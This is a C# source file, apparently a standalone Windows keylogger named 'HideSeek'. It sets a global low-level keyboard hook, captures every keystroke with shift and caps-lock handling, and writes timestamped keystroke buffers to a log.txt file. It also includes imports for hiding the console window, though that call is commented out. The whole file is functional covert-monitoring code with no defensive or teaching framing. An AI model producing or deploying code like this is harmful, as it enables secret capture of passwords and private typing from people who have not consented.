using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

namespace HideSeek {
    class Program {

        /// <summary>
        /// defines the callback type for the hook
        /// </summary>
        public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);

        public struct keyboardHookStruct {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        private const byte VK_RETURN = 0X0D; //Enter
        private const byte VK_SPACE = 0X20; //Space
        private const byte VK_SHIFT = 0x10;
        private const byte VK_CAPITAL = 0x14;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int BUFFER_DEFTIME = 5000;
        //private static LowLevelKeyboardProc _proc = HookCallback;
        private static keyboardHookProc khp;
        private static IntPtr hhook = IntPtr.Zero;

        /// <summary>
        /// Occurs when one of the hooked keys is released
        /// </summary>
        public event KeyPressEventHandler KeyPress;

        private static int _bufferTime = 5;
        public static int BufferTime {
            get { return _bufferTime; }
            set {
                _bufferTime = value;
                if (_bufferTime == 0) {
                    ReleaseBuffer();
                }
            }
        }
        private static StringBuilder buffer;

        static void Main(string[] args) {

            buffer = new StringBuilder();

            var handle = GetConsoleWindow();

            // Hide
            //ShowWindow(handle, SW_HIDE);
            
            Program prog = new Program();

            khp = new keyboardHookProc(prog.hookProc);
            hhook = prog.hook();

            new Thread(() => {
                do {
                    if (BufferTime != 0) {
                        Thread.Sleep(1000);
                        BufferTime--;
                    } else {
                        Thread.Sleep(2 * 1000);
                    }
                } while (true);

            }).Start();

            Application.Run();
            UnhookWindowsHookEx(hhook);
        }

        private static void ReleaseBuffer() {
            using (var sw = new StreamWriter(Application.StartupPath + @"\log.txt", true)) {
                sw.WriteLine($"{DateTimeOffset.Now} => {buffer.ToString()}");
                sw.Close();
                buffer.Clear();
            }
        }

        /// <summary>
        /// The callback for the keyboard hook
        /// </summary>
        /// <param name="code">The hook code, if it isn't >= 0, the function shouldn't do anyting</param>
        /// <param name="wParam">The event type</param>
        /// <param name="lParam">The keyhook event information</param>
        /// <returns></returns>
        public int hookProc(int code, int wParam, ref keyboardHookStruct lParam) {
            BufferTime = 5;

            if (code >= 0) {
                if (wParam == WM_KEYDOWN) {
                    byte[] keyState = new byte[256];
                    GetKeyboardState(keyState);
                    byte[] inBuffer = new byte[2];
                    if (ToAscii(lParam.vkCode, lParam.scanCode, keyState, inBuffer, lParam.flags) == 1){
                        char key = (char)inBuffer[0];                        
                        bool isDownShift = ((GetKeyState(VK_SHIFT) & 0x80) == 0x80 ? true : false);
                        bool isDownCapslock = (GetKeyState(VK_CAPITAL) != 0 ? true : false);
                        if ((isDownCapslock ^ isDownShift) && Char.IsLetter(key)) {
                            key = Char.ToUpper(key);
                        }

                        buffer.Append(key);

                        if (KeyPress != null) {
                            KeyPressEventArgs e = new KeyPressEventArgs(key);
                            KeyPress(this, e);
                            if (e.Handled)
                                return 1;
                        }
                    }
                }
            }
            return CallNextHookEx(hhook, code, wParam, ref lParam);
        }

        public IntPtr hook() {
            IntPtr hInstance = LoadLibrary("User32");
            return SetWindowsHookEx(WH_KEYBOARD_LL, khp, hInstance, 0);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
            using (Process curProcess = Process.GetCurrentProcess())

            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        //These Dll's will handle the hooks. Yaaar mateys!
        /// <summary>
        /// Loads the library.
        /// </summary>
        /// <param name="lpFileName">Name of the library</param>
        /// <returns>A handle to the library</returns>
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        /// <summary>
        /// Sets the windows hook, do the desired event, one of hInstance or threadId must be non-null
        /// </summary>
        /// <param name="idHook">The id of the event you want to hook</param>
        /// <param name="callback">The callback.</param>
        /// <param name="hInstance">The handle you want to attach the event to, can be null</param>
        /// <param name="threadId">The thread you want to attach the event to, can be null</param>
        /// <returns>a handle to the desired hook</returns>
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

        /// <summary>
        /// Calls the next hook.
        /// </summary>
        /// <param name="idHook">The hook id</param>
        /// <param name="nCode">The hook code</param>
        /// <param name="wParam">The wparam.</param>
        /// <param name="lParam">The lparam.</param>
        /// <returns></returns>
        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="vKey"></param>
        /// <returns></returns>
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern short GetKeyState(int vKey);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="pbKeyState"></param>
        /// <returns></returns>
        [DllImport("user32")]
        private static extern int GetKeyboardState(byte[] pbKeyState);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="uVirtKey"></param>
        /// <param name="uScanCode"></param>
        /// <param name="lpbKeyState"></param>
        /// <param name="lpwTransKey"></param>
        /// <param name="fuState"></param>
        /// <returns></returns>
        [DllImport("user32")]
        private static extern int ToAscii(
            int uVirtKey,
            int uScanCode,
            byte[] lpbKeyState,
            byte[] lpwTransKey,
            int fuState);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        //private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
